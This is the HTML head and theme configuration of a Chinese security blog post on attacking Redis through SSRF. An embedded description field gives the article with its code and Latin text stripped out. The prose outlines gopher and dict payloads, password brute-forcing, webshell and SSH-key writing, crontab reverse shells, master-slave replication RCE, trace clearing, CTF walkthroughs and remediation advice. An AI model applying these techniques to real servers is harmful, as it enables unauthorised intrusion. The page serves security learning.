<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>ssrf打redis | hybcx</title><meta name="keywords" content="基础知识"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="ssrf打redis"><meta name="application-name" content="ssrf打redis"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="ssrf打redis"><meta property="og:url" content="http://hybcx.xyz/2023/12/27/ssrf-da-redis/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 SSRF介绍 SSRF，服务器端请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。今天学习一手redis中如何利用SSRF，感觉这个在实战中不怎么常见，但其中的知识值得学习 0x02 环境搭建 这里在又是废了一天搭建成功，建议大"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 SSRF介绍 SSRF，服务器端请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。今天学习一手redis中如何利用SSRF，感觉这个在实战中不怎么常见，但其中的知识值得学习 0x02 环境搭建 这里在又是废了一天搭建成功，建议大"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/12/27/ssrf-da-redis/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'ssrf打redis',
  postAI: '',
  pageFillDescription: '0x01 SSRF介绍, 0x02 环境搭建, 0x03 前置知识, RESP协议, 0x04 Redis配合gopher协议进行SSRF, 概述, 利用条件, 利用, redis认证攻击, 无密码Redis攻击, 有密码Redis攻击, 绝对路径写webshell, 构造payload, 写ssh公钥, 生成攻击机公钥, 利用contrab计划任务反弹shell, 构造payload, 0x05 Redis主从复制RCE, 介绍, 利用条件, 主从复制概念, redis module, 攻击原理, 全量复制的过程, 增量复制（部分复制）, 攻击流程, 任意文件写入, , , 痕迹清除, 0x06 题目实战, CTFHUB-SSRF-redis协议, Redis 4.x/5.x主从复制RCE, [网鼎杯 2020 玄武组]SSRFMe, Weblogic SSRF漏洞, 简介, 漏洞复现, 0x07 修复建议, 0x08 知识总结, Dict协议使用注意事项, crontab写入Tips, 0x09 参考文章介绍服务器端请求伪造是由攻击者构造的漏洞用于形成服务器发起的请求通常攻击的目标是外部网络无法访问的内部系统今天学习一手中如何利用感觉这个在实战中不怎么常见但其中的知识值得学习环境搭建这里在又是废了一天搭建成功建议大家还是直接下载服务搭建比较好网上的教程属实是有点垃圾且害人这里我的版本的安装修改配置文件设置密码监听等配置监听只监听本地端口如果需要远程登录可以在后面加上本机的同时远程登录也可能造成未授权访问配置默认密码默认无密码要设置密码可以将前面的删除然后将改为要设置的密码启动或者这种方法启动可能会造成在目录计划任务目录目录等其他一些目录没有写入的权限就算是身份启动文件夹权限也不行就很迷如果遇到在执行时报错就还是试试身份第一种方法启动吧第二天了你没猜错这玩意儿又废了我一天时间搭建最终还是选择搭建成功具体可以参考环境搭建搭建环境只需要将其中的服务安装好即可最后记得在防火墙开启所需要的端口其中代码如下创建新的资源设置和相应的选项抓取内容并把它传递给浏览器存储进文件关闭资源并且释放系统资源测试没毛病前置知识这里看到师傅们在探讨这一问题的时候需要学习一手协议那我们跟着师傅学一手协议服务器与客户端通过协议通信协议是在中引入的但它成为了与中的服务器通信的标准方式这是您应该在客户端中实现的协议实际上是一个支持以下数据类型的序列化协议简单字符串错误整数批量字符串和数组在中用作请求响应协议的方式如下客户端将命令作为的数组发送到服务器服务器根据命令实现回复一种类型在中某些数据的类型取决于第一个字节对于回复的第一个字节是对于回复的第一个字节是对于回复的第一个字节是对于回复的第一个字节是对于回复的第一个字节是此外能够使用稍后指定的或的特殊变体来表示值在中协议的不同部分始终以结束我们用来抓个客户端与服务器通信的包来分析一下命令参数说明指定网卡一般指定这里抓取本地接口的流量需要指定为抓取数据包时默认抓取长度为字节加上后可以抓到完整的数据包指定抓取的端口保存到文件后接保存的路径与文件名这里本地先开启监听之后进入服务器之后在服务器执行如下命令最后将产生的数据包传入追踪数据流这里对于该工具的使用方法几乎不懂但好在找到了目标数据如上图所示抓到的数据包如下结合我们上面对协议的解释我们来逐行分析代表数组也就是这个数组长度为可以将之间的空格认为是分隔符代表批量字符串长度为之后的同理最后的代表简单字符串其中代表设置为对应的为最后的代表服务端执行成功后返回的字符串转储看一下正如前面所说的客户端向将命令作为的数组发送到服务器然后服务器根据命令实现回复给客户端一种类型这里的代表也就是回车换行符在这里代表结束符那有趣的来了如果我们将上述的数据进行编码随后在本机中通过和发送给服务器会如何呢经过编码后注意这里的需要换成再接着如上图可以看到左侧的代表我们执行成功右图是我们登录服务器之后验证的值是否被设置了这里看到师傅还尝试直接使用命令发送而不采取数据流了我们也尝试一下命令编码后如上图看到成功返回了我们刚刚设置的的值说明直接发送命令的方法也是可行的知道了如何让服务器执行我们的命令那么接下来我们就来看如何攻击来达到的目的配合协议进行概述协议是协议出现之前在中常见的一个协议但现在这个协议用的越来越少了但该协议在中却大有用途可以用来攻击等还可以发送请求这在攻击中大有作为利用条件所在的服务端存在未授权访问或者通过弱口令可以访问到利用常见的攻击方式大概有这几种认证攻击绝对路径写写公钥写计划任务反弹下面我们逐个实现认证攻击这里呢也是可以分为两种情况的一种是遇到默认无密码的服务器另一种就是有密码的无密码攻击先考虑无密码的这里呢其实也就是我们上述中介绍过的可以直接构造恶意的明文命令或者数据流发送给服务器但这里呢如果对方的服务暴露在公网这就好办了直接发送协议即可但如果对方限制只监听本地请求那我们就只能祈祷对方服务器存在接下来对于无密码的我就直接上面的了如果我们将上述的数据进行编码随后在本机中通过和发送给服务器会如何呢经过编码后注意这里的需要换成再接着如上图可以看到左侧的代表我们执行成功右图是我们登录服务器之后验证的值是否被设置了这里看到师傅还尝试直接使用命令发送而不采取数据流了我们也尝试一下命令编码后如上图看到成功返回了我们刚刚设置的的值说明直接发送命令的方法也是可行的知道了如何让服务器执行我们的命令那么接下来我们就来看如何攻击来达到的目的有密码攻击这里我们先确定一个登录认证密码修改下的配置文件搜索关键字如下图将去掉并在后面添加密码退出后重新启动服务接着我们开始爆破对于这种需要密码登录认证的我们可以尝试弱密码但手动太麻烦这里我就跟师傅学着写个脚本请输入目标爆破成功密码为上图为简单的字典如下图可以看到最后停在了这里说明密码为如下图检验成功绝对路径写据说这个方法是最常用的构造先构造命令删除数据库中所有的设置键值为一句话木马设置数据库文件存储位置这里设置为了目录设置数据库文件名为这里是指示在下一次保存其数据库时存储为目录这个命令告诉立即同步保存数据到磁盘上的数据库文件这里的目的就是向对方服务器的目录写入一句话木马这里师傅自己写了个转化为协议格式的脚本这里我直接了我是大彩笔得到的如下不过下面只进行了一次编码而如果我们利用的是的话一般就要编码两次二次编码后最后在发送上述即可服务端看到木马成功写入下图验证成功在这里推荐一个工具虽然之前的文章工具就可以打不过感觉这个更专业环境下运行得到的内容记得二次编码发送依旧成功写入写公钥如果目录存在则直接写入如果不存在则可以利用创建该目录不过需要注意这种方法需要确保靶机允许使用密钥登录开启方法需要修改配置文件改为然后重启即可我们先直接尝试登录靶机试试可以看到是需要登录密码的那我们开始攻击生成攻击机公钥这里呢我对公钥私钥的原理什么的忘记了具体原理我认为可以参考的原理与应用其中对咱们这次的攻击思路有帮助的是使用密码登录每次都必须输入密码非常麻烦好在还提供了公钥登录可以省去输入密码的步骤所谓公钥登录原理很简单就是用户将自己的公钥储存在远程主机上登录的时候远程主机会向用户发送一段随机字符串用户用自己的私钥加密后再发回来远程主机用事先储存的公钥进行解密如果成功就证明用户是可信的直接允许登录不再要求密码这种方法要求用户必须提供自己的公钥如果没有现成的可以直接用生成一个运行上面的命令以后系统会出现一系列提示可以一路回车其中有一个问题是要不要对私钥设置口令如果担心私钥的安全这里可以设置一个运行结束以后在目录下会新生成两个文件和前者是公钥后者是私钥这也就是说我们可以想办法将自己攻击机的公钥发送到对方服务器上这样我们以后对其请求远程连接的时候就没必要输入密码了这里一路回车即可最后进入目录下即可看到公钥和私钥如下图前者为私钥后者为公钥最后我们修改一下上述脚本二次编码的结果成功写入接下来我们远程连接看看成功实现免密登录利用计划任务反弹这个方法只能上使用上行不通原因如下因为默认写文件后是的权限但要求执行定时任务文件权限必须是也就是才会执行否则会报错而的定时任务文件权限也能执行因为保存会存在乱码在上会报错而在上不会报错由于系统的不同定时文件位置也会不同的定时任务文件在定时任务文件在和均存在的需要权限高版本的默认启动是权限故写这个文件是行不通的构造这里我再复习一波反弹命令的原理吧端口表示的是调用命令的交互模式并将交互模式重定向到端口中这里我们将和端口改为我们攻击机的地址和监听端口重定向时加入一个描述符表示直接作为数据流输入不加时重定向默认是输出到文件里的地址端口号是下的特殊文件表示对这个地址端口进行连接这里我们设置成攻击机监听的地址最后面的此时攻击机和靶机已经建立好了连接当攻击机进行输入时就是这里的标准输入通过重定向符重定向到标准输出中由于是作为的标准输入所以就执行了系统命令了接下来开始写入定时任务构造的命令如下转化为协议的格式修改上述脚本即可二次编码后的结果如下发送后看一下靶机是否被成功写入接着攻击机开启监听等一会儿即可如下图成功拿到不过这里也可以用我推荐过的工具他这里默认监听端口为需要注意一下同样二次编码后看靶机如下图成功写入成功那不过这里这个工具是反弹暂时也不知道这两种方式有何区别主从复制这里搞着搞着就到了主从复制了回想起之前搞这玩意儿弄得心烦环境一直搞不好看来是时候解决了介绍是由战队队员在上提出的基于主从复制的演讲的地址为利用条件能未授权或者能通过弱口令认证访问到服务器可动态修改备份文件路径主从未校验可信服务端主从复制概念主从复制是指将一台服务器的数据复制到其他的服务器前者称为主节点后者称为从节点数据的复制是单向的只能由主节点到从节点的持久化使得机器即使重启数据也不会丢失因为服务器重启后会把硬盘上的文件重新恢复到内存中但是如果硬盘的数据被删除的话数据就无法恢复了如果通过主从复制就能解决这个问题主的数据和从上的数据保持实时同步当主写入数据时就会通过主从复制复制到其它从这里就跟着师傅搭建主从复制了属实是不懂唉建立主从复制有种方式配置文件写入启动命令后加入连接到客户端之后执行建立主从关系只需要在从节点操作就行了主节点不用任何操作我们先在同一个机器开两个实例一个端口为一个端口为这里我们在上面搭建的基础上同一目录下新建文件接着将之前已经有的目录下的配置文件赋值到文件中接着修改其中端口为即可可参考搭建多个实例这里需要在服务所在目录下启动而后面的内容为配置文件路径可以看到均启动成功我们把设置为为这里这个师傅是将所在服务器当做主服务器了可以看到在成功设置主从关系之后我们在主服务器上设置某些数据之后在上可以看到数据的同步如果我们想解除主从关系可以执行自从之后新增了一个模块功能模块可以使用外部模块扩展功能以一定的速度实现新的命令并具有类似于核心内部可以完成的功能模块是动态库可以在启动时或使用命令加载到中恶意文件编写攻击原理利用步骤贴一下上的步骤和的握手协议过程图中一些常量说明等待和连接握手状态开始等待返回发送认证消息等待认证回复发送信息主要是当前实例监听端口等待返回发送等待返回发送等待返回握手状态结束正在从接收文件这里的重点就是利用全量复制将上的文件同步到上也就是将我们的恶意文件传输到上从而达到加载恶意文件达到那为什么一定是全量复制呢理由如下当向发送命令之后一般会得到三种回复进行全量复制进行增量同步当前还不支持全量复制的过程向发送请求并携带的和如果是第一次连接的话不知道的所以会返回为为我们来测试以下看看是不是真的如此这里我们先对的输入解除他与之间的主从关系接着开启监听在上设置为的主服务器这里我操作失误了连接第二次我才搞懂得干嘛似乎就是连接你之后你需要回复指定命令与其进行通信最后返回的和即主服务器需要执行的响应内容如下从服务器探测主服务器是否存活存活响应交换主从节点复制信息确认同步状态以及传输方式同步数据正确的应该是这样过程是这样的验证发来的是否和自身一致如不一致则进行全量复制把自己的和发给对发来的和进行保存进行生成文件将写好的文件传输给并将缓冲区内的数据传输给加载文件和缓冲区数据增量复制部分复制增量复制的过程这里简单带过一下就是当向要求数据同步时会发送的和如果和上的不对应则会进行全量复制如果相同则进行数据同步但是不会传输文件通过了解全量复制和增量复制的过程我们应该大致知道为什么一定要用全量复制而不用增量复制了但是这样我感觉还是欠点什么因为我认为我没有完全搞懂又找了几篇文章发现这个解释的很好提供了种不同的持久化方式方式在指定的时间间隔内生成数据集的时间点快照和方式记录服务器执行的所有写操作命令方式备份数据库的文件名默认为可以在配置文件中通过修改参数进行修改无法在客户端交互中动态设置而方式备份数据库的文件名默认为此文件名可以通过客户端交互动态设置来更改这也说明了我们为何要选择方式了上图可以看到我们可以任意设置文件名但对于却不行而重点如下主从复制模式下数据单向从主节点流向从节点在从节点首次注册时会对主节点数据进行全量复制复制过程中用记录读取的数据大小以便中断后断点续传如果从节点初始没有数据通过主从复制可以将主节点设置的文件全量复制到从节点的中从而实现任意文件上传这也就说明了攻击的时候似乎只能一次成功吗毕竟如果第二次连接就不是首次注册了不过原理算是彻底明白了攻击流程第一个就是先配置一个攻击服务器这个服务器是用于被受害者服务器连接的也就是我们的靶机为从服务器攻击机为主服务器而恶意文件就在我们的攻击机上而攻击机在于交互的过程中需要发送如下信息测试连接是否可用告诉连接可用发送信息主要是当前实例监听端口告诉成功接受发送告诉成功接受发送这里样的话才算成功的冒充为了一名合格的主服务器如下图所示这里我就借用了而此时的从服务器需要主动的发送如下信息实际就是我们操控它发送设置的备份路径为当前目录修改备份文件名设置为对应服务器的从节点加载复制过来的关闭主从复制关系防止脏数据复制执行命令任意文件写入这里呢我是先配置的服务对外开放端口后续再说这里开启之后呢我并没有对设置登录密码但同时要设置取消保护模式同时对于监听本地的那一行需要注释掉接下来我们连接测试一下如下图可以看到能成功连接这里的话先连接上之后设置备份文件目录以及备份文件名然后执行使其成为我们恶意服务的从恶意在接收到的命令后返回命令并将紧跟着发送最终被写到的当中恶意如下我们要传输的恶意文件的路径之后现在上执行如下命令配置好之后我们开启恶意当其运行结束后我们在靶机上即可查看到被写入这里肯定想着为何上执行个就写入了呢因为在此之前我们已经将我们的恶意设置为了主那我们在其中的任何操作都可以同步到从也就是我们的靶机我们这里的逻辑就是与从服务器命令交互完直接发送造成文件上传实际上细细研究发现这里似乎存在一个时间问题比如我早就在从上配置好了我主的即端口但此时主还没开启是休眠状态但一当我开启主从就会向主发送命令等待具体的回复究竟是要进行全量复制还是增量复制等等等等而我们上述的恶意会在从发送给我们命令之后给予相关的回应最后发送给从进行全量复制的命令最终导致我们的恶意文件上传效果加载恶意这里思路大致与上述一直这里我们改一下配置即可注意这里依旧是利用未授权设置的备份路径为当前目录设置备份文件名为默认为设置主服务器和端口加载恶意模块执行系统命令如图所示配置好后我们开启恶意但这里不知道为何设置备份目录为当前的时候不成功就先设置了我们要传输的恶意文件的路径记得修改恶意文件路径吗如下图运行之后执行命令成功进行加载这里虽然进行了上述的实操但感觉不够真实毕竟感觉现实中存在的概率才是大的虽然可以爆破弱口令但总感觉少点什么而且这里的攻击的过程一直没搞成功现在再来搞一下这里我们先取消的主从关系并且重新配置文件开启目标的保护模式以及只让其监听本地之后重启服务确定一下对方服务的配置现在我们进行构造恶意命令第一次攻击第二次攻击在这里分两次是因为第一次我们在传入命令之后还未被加载之后第二次才输入的加载指令当然你也可以合并上述两个然后发送两次这里进行了两次编码但是在我发送两次之后页面并没有回显不知道是否是配置问题但在靶机上测试如下发现是成功加载的这让我突然迷惑了是否我太过钻牛角尖了本来如果这里存在的话我们本就可以进行写入公钥写等等这样的话我们完全就可以连接上对方服务这样的话就没必要非得利用来了这里的疑惑还是通过一会儿的做题来感受吧痕迹清除为了减少对服务器的影响攻击完成后应该尽量清除痕迹需要恢复目录和数据库文件卸载同时删除模块而数据原本的配置信息需要在攻击之前进行备份获取所有的配置获取快照文件保存的位置获取快照文件的文件名切断主从关闭复制功能恢复目录通过文件恢复数据删除卸载模块的加载漏洞利用的版本是如果是先前版本的则无法加载模块自然也就无法利用在网上开了几个开源的利用脚本都没有进行版本的判断如果直接使用除了攻击失败外可能会修改了和这些都可以通过未授权修改回原来的配置前提是有提前备份而目录下会多生成一个文件题目实战协议看到那开始测试发现存在的服务那我们看看是否对方设置了密码脚本跑一下如下图发现没有设置那这里我想的就是先尝试写话不多说直接上脚本运行这里需要两次编码直接上传之后访问成功上传并拿到主从复制复现地址直接一键启动靶机之后尝试连接目标如下图存在未授权访问直接上这里使用了两种但感觉第一种更好一点可以看到直接就拿到了第二个网鼎杯玄武组这里推荐去平台复现似乎有问题这里的重点就是针对的检查其中的对于用到的协议他规定只能是与但我们重点需要绕过的是这个这里是将一个标准地址转换为二进制形式的长字符串然后与这里规定的进行比较如果有一个为真则证明标志的的攻击初始的的二进制表示右边有两位空出执行右移两位后这里绕过似乎也挺简单的就是即可然后根据题目提示让我们查看随后就是通过函数处理传参并且代码中提示我们的密码是这也提示我们这道题考察的就是如何通过攻击这里验证也说明的存在接下来先尝试向其中加载恶意不过需要注意密码的验证如下用户认证设置备份目录设置备份文件名设置主从关系这里的主设置为我们的恶意从我们的恶意主上加载恶意执行命令进行反弹但这道题用到的是所以上脚本发送之前我们先准备好恶意且必须是公网的这里推荐项目上面这个用于需要授权的攻击使用这个用于目标是未授权的时候使用这里我们输入如下命令这里需要将恶意文件放入同目录下指定文件路径为我们的设置为要监听的端口这里实际上我们是等待被动连接这里开启了上述服务后我们构造命令发送这里我是分了两批发送一起发送也是可以的不过就得发送两次了这里将得到的发送到漏洞点接着就会发现我们的恶意服务收到了连接请求但要注意在上开启接受反弹的端口最后就会发现我们成功拿到这里不知为何截图都没了懒得在搞了吐槽一手题目环境害人啊我一直不成功还以为是我思路有问题一直想不出来漏洞简介是美国公司出品的一个确切的说是一个基于架构的中间件是用于开发集成部署和管理大型分布式应用网络应用和数据库应用的应用服务器中存在一个漏洞利用该漏洞可以发送任意请求进而攻击内网中等脆弱组件影响范围版本版本漏洞复现复现环境如上图代表成功启动这里我们直接抓个包这里我先用扫个目录可以发现还是有很多的这里测试一番发现这个目录很可疑如上图这里似乎是个未授权访问点击第一个连接的抓包发现如下图存在一个链接这里修改个参数值为如下图发现其好像在尝试连接这个地址我们探测一下端口存活情况爆破端口之后发现下图这里并没有探测到什么重点端口这里我就不会了看了发现比我想的更复杂这里需要探测内网而我只是单纯探测个端口而已这里顺便补充一个资料乌云大会上猪猪侠师傅介绍的服务探测接下来就进行内网的探测不过这里需要注意的是我们是用搭建的因此探测的时候应该使用的段来探测我们开始设置爆破格式自定义迭代器的类型这里在中输入然后下方添加分隔符位置填入与分隔符这里搞错了对我的靶机来说是该填入的位置三设置与分隔符然后位置设置但不需要设置分隔符开始爆破结果如下图所示这里的爆破就说明我们的是存在的但是对应的端口不存在那我们直接探测该的端口存活情况即可设置好开始爆破如下图所示这里的报错说明我们的端口是存活的的有一个比较大的特点就是我们可以通过传入来注入换行符而某些服务如是通过换行符来分隔每条命令也就说我们可以通过该攻击内网中的服务器那接下来我们尝试写入定时任务反弹选择模式这里只需要一次编码即可如上图成功反弹这里有点懵逼的是我看那些师傅都在前后加个的无用字符不知道为何我这里删除之后测试依旧可以反弹搜了多个文章也无果希望日后可以解惑吧这里我们可以通过上述命令来得知容器的地址修复建议设置访问白名单入防止恶意访问和出防止恶意设置为主从添加认证在配置文件中修改属性为强口令完成后重启服务器动态命令设置重命名相关命令在配置文件中也可以设置为空来禁用对于恶意特征可以通过命令查看当前加载的模块信息重点关注非官方加载或者等恶意关键词监控服务器上进程写入的文件为文件流量中可以重点关注命令以及相关文件二进制特征和等知识总结协议使用注意事项协议中可以用代替空格会截断后面的内容写马的情况下要想办法协议一次只能发送一条数据写入将任意文件写到该目录下效果和相同格式也要一致并且在该目录操作可以做到不覆盖任何其他文件的情况进行弹系统下用户的文件系统下用户的文件参考文章主从复制浅析中的利用主从复制影响分析服务端请求伪造之篇利用攻击内网服务服务端请求伪造之篇主从复制分析很经典的一道网鼎杯玄武组利用漏洞攻击内网反弹中的利用漏洞复现及攻击内网一附批量检测脚本',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-03-31 09:00:46',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
